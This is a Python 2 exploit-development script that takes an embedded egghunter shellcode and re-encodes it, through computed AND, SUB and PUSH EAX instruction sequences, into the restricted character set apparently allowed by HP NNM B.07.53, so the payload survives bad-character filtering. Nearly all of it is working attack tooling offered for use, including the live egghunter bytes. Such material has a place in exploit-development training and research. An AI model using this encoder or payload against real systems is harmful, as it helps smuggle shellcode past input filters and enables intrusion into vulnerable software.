#!/usr/bin/env python

# author: greyshell
# description: Generate encoded shellcode based on the allowed character set

import sys
import binascii

# Paste HPNNM- B.07.53 allowed character set
allowed = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")

# Paste egghunter opcode here:
encode_input = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x54\x30\x30\x57\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Defining global variables
carry = 0x00
matrix = [[0 for x in range(3)] for x in range(4)] 
x = 0
flag = 0
p = 1
eaxenocder = []
opcode_arr_eaxzero = []
opcode_arr_sub_ins = []
encoded_final_shellcode = ''

# Printing valid operation to set EAX = 0
def printeax_zero_Ins():
	global opcode_arr_eaxzero 
	opcode_arr_eaxzero = []
	for r1 in range(1, -1, -1):
		tmpv = eaxenocder[r1]
		opcode_len = len(tmpv)
		opcode_padding_len = 2 - len(tmpv)
		tmp_pad = ""
		for p in range(0,opcode_padding_len):
			tmp_pad = "0" + tmp_pad
		
		tmpv = tmp_pad + tmpv
		tmpv = str(tmpv)
		for p in range(0,2):
			tmpv =  tmpv + tmpv
		opcode1 = "0x" + tmpv
		opcode_arr_eaxzero.append(opcode1)
	
	# print '[-] Clearing EAX to start from clean state'
	# print 'AND EAX,%s' % opcode_arr_eaxzero[0]
	# print 'AND EAX,%s' % opcode_arr_eaxzero[1]
	# print
	return


def eax_zero_encoding():
	global eaxenocder
		
	y = 0
	for i in bytearray(allowed):
		for k in bytearray(allowed):
			# AND opcode for this instruction is also true
			if (hex((i) & (k))[2:] == "0"):  
				eaxenocder.append(hex(i)[2:])
				eaxenocder.append(hex(k)[2:])  
				return


def printIns():
	global opcode_arr_sub_ins
	opcode_arr_sub_ins = [] 
	for r2 in range(2, -1, -1):
		opcode1 = ""
		for r1 in range(3, -1, -1):
			tmpv = matrix[r1][r2]
			if (len(str(tmpv))) < 2:
				tmpv = "0" + str(tmpv)	
			opcode1 = opcode1 + tmpv
		opcode1 = "0x" + opcode1
		opcode_arr_sub_ins.append(opcode1)
		
	# print 'SUB EAX,%s' % opcode_arr_sub_ins[0]
	# print 'SUB EAX,%s' % opcode_arr_sub_ins[1]
	# print 'SUB EAX,%s' % opcode_arr_sub_ins[2]
	
	# Calculate operations
	c1 = hex(int(opcode_arr_sub_ins[0],16))
	c2 = hex(int(opcode_arr_sub_ins[1],16))
	c3 = hex(int(opcode_arr_sub_ins[2],16))
	checksum = hex(int('0', 16) - int(c1, 16) - int(c2, 16) - int(c3, 16))
	# print '[++] Now EAX ==========================> ',checksum
	# print

	return

def twoComplement(seg):	
	num = seg
	temp = num[6] + num[7] + num[4] + num[5] + num[2] + num[3] + num[0] + num[1]  
	num = temp
	# print '[+] Little endian format: %s' %temp.lower()
	y = hex(0xFFFFFFFF - int(num,16) + 0x1)
	y = y.rstrip("L")[2:]
	
	if (len(y) == 6):
		y = "00" + y
		
	return (y)

def manualEncoding(opcode):
	# Custom encoding based on 3 SUB Instructions
	global carry
	global x
	global matrix
	global flag
	global p
	flag = 0
	y = 0
	
	
	# count the opcode to clear carry every after 4th 
	# print '[-] p =', p
	if p <= 4:
		p = p + 1
	else:
		p = 1
		# print '[-] Reset carry and pointer due to complete one block processing'
		# print '[-] p = ', p
		p = p + 1
		carry = 0
	# adjust opcode if carry
	tempc = opcode[0:1] 
	l = len(opcode)
	# print '[-] Processing: ', opcode
	# print '[-] Opcode length: ', l
	
	if carry == 1:
		opcode = hex(int(opcode,16) - 0x01)
		# print '[-] Opcode adjustment: Substract 1 from present opcode due to carry'
		# print '[-] New adjusted opcode: ', opcode
		opcode = opcode[2:4]
		tempc = opcode[2:4]
		carry = 0
	
	# Adjust opcode 
	if (l <= 2 and (tempc == '0')):
		# print "[-] Due to less length append 1 before opcode"
		opcode = '1' + opcode
		for i in bytearray(allowed):
			for j in bytearray(allowed):
				for k in bytearray(allowed):					
					tmp = hex((i) + (j) + (k))
					op = str(tmp)
				
					if (op[2:5] == opcode):
						# print '[-] Found 3 numbers for sub operations:', hex(i)[2:], hex(j)[2:], hex(k)[2:]
						matrix[x][y] = hex(i)[2:]
						y = y + 1
						matrix[x][y] = hex(j)[2:]
						y = y + 1
						matrix[x][y] = hex(k)[2:]
						# print '[-] Carry has been generated while finding 3 numbers.'
						carry = 1
						return  
					
	else:
		# print "[-] Opcode length is ok"
		spclop = '1' + opcode
		for i in bytearray(allowed):
			for j in bytearray(allowed):
				for k in bytearray(allowed):					
					tmp = hex((i) + (j) + (k))
					op = str(tmp)
				
					if (op[2:4] == opcode):
						# print '[-] Found 3 numbers for sub operations:', hex(i)[2:], hex(j)[2:], hex(k)[2:]
						matrix[x][y] = hex(i)[2:]
						y = y + 1
						matrix[x][y] = hex(j)[2:]
						y = y + 1
						matrix[x][y] = hex(k)[2:]
						# print '[-] No carry has been generated while finding 3 numbers'
						carry = 0
						return
						
					if (op[2:5] == spclop):
						# print '[-] Found 3 numbers for sub operations:', hex(i)[2:], hex(j)[2:], hex(k)[2:]
						matrix[x][y] = hex(i)[2:]
						y = y + 1
						matrix[x][y] = hex(j)[2:]
						y = y + 1
						matrix[x][y] = hex(k)[2:]
						# print '[-] Carry has been generated while finding 3 numbers.'
						carry = 1
						return
					
	# If byte cant be split into 3 bytes due to less allowd chars
	if(flag == 0):
		print "[+] Info: Less allowed chars ..."
		print "[+] Info: Unable to encode with 3 sub operations ..."
		sys.exit();
	
	return 


def print_opcode(i):
	global encoded_final_shellcode;
	if(i==0):
		for r1 in range(0, 2):
			num = opcode_arr_eaxzero[r1][2:]
			temp = "\\x" + num[6] + num[7] + "\\x" + num[4] + num[5] + "\\x" + num[2] + num[3] + "\\x" + num[0] + num[1]  
			encoded_final_shellcode = encoded_final_shellcode + "\\x25" + temp
			
	elif(i==1):
		for r1 in range(0, 3):
			num = opcode_arr_sub_ins[r1][2:]
			temp = "\\x" + num[6] + num[7] + "\\x" + num[4] + num[5] + "\\x" + num[2] + num[3] + "\\x" + num[0] + num[1]  
			encoded_final_shellcode = encoded_final_shellcode + "\\x2D" + temp
			
	elif(i==2):
		encoded_final_shellcode = encoded_final_shellcode + "\\x50"
		
	return
	
	
def padding(shellcode,count):
	# Pad char = \x41 ==> INC ECX that is not bad char and has no effect on manual encoder logic
	pad = "\\x41"
	rem = count % 16
		
	if (rem ==0):
		print "[+] Info: No padding is required in shellcode "
		return shellcode
	if (rem == 4):
		print "[+] Info: Three chars are padded, pad char: ", pad		
		pad = pad * 3	
	elif (rem == 8):
		print "[+] Info: Two chars are padded, pad char: ", pad
		pad = pad * 2	
	elif (rem == 12):
		print "[+] Info: One char is padded, pad char: ", pad
		pad = pad * 1
	
	pad_shellcode = shellcode + pad	
	return pad_shellcode

def checkOps():
	# Checking the operand has any bad characters
	flag_1 = 0
	flag_2 = 0
	flag_3 = 0

	for i in bytearray(allowed):
		tmp= hex(i)
		
		# AND EAX, value
		if (tmp[2:] == "25"):
			flag_1 = 1
		
		# SUB EAX, value
		if (tmp[2:] == "2d"):
			flag_2 = 1
		
		# PUSH EAX
		if (tmp[2:] == "50"):
			flag_3 = 1
			
	if (flag_1 != 1 or flag_2 != 1 or flag_3 != 1):
		print "[+] Info: Operand contains bad character.. unable to proceed."
		sys.exit(0);
	else:
		print "[+] Info: SUB/PUSH/AND EAX - opcodes are in allowed character set."
	
	return
	
def main():
	
	global x
		
	try:	
		checkOps()		

		sum = ""
		for character in encode_input:
			sum = sum + "\\x" + character.encode('hex')
		
		shellcode = sum
		count = len(shellcode)
		 
		pad_shellcode = padding(shellcode,count)

		count = len(pad_shellcode)
		fstring = pad_shellcode
		
		print '[+] shellcode = '
		print fstring.lower()
		l = count / 4
		print '[+] shellcode length: ', l

		# Stripping in reverse order
		print 
		n = l / 4
		for j in range (0,n):
			temp = fstring[(count - 16):count]
			seg = temp[2] + temp[3] + temp[6] + temp[7] + temp[10] + temp[11]  + temp[14] + temp[15] 
			# print
			# print '[++] Number to encode: %s' % seg.lower()
			twoCom = twoComplement(seg)
			twoComLen = len(twoCom)
			if twoComLen < 8:
				twoCom = "0" + twoCom
			# print '[++] 2''s complement ====================> 0x%s' % twoCom.lower()
			# print '[++] Assembly Instructions:'
			x = 0
			manualEncoding(twoCom[6:8])
			x = x + 1
			manualEncoding(twoCom[4:6])
			x = x + 1
			manualEncoding(twoCom[2:4])
			x = x + 1
			manualEncoding(twoCom[0:2])
			
			# clear EAX function
			eax_zero_encoding()
			printeax_zero_Ins()
			# SUB operations
			printIns()		
			print_opcode(0)
			print_opcode(1)
			print_opcode(2)
			# loop counter
			count = count - 16
		
		print '[+] encoded shellcode: '
		print encoded_final_shellcode
		print 
		print '[+] encoded shellcode length: ', len(encoded_final_shellcode)/4

		
	except Exception as e:
		print '[+] Info: Inside expect block to handel exception'
		exc_type, exc_obj, exc_tb = sys.exc_info()
		print(exc_type,exc_tb.tb_lineno)
		print e
	else:
		pass
	
	finally:
		pass

if __name__ == '__main__':
	main()
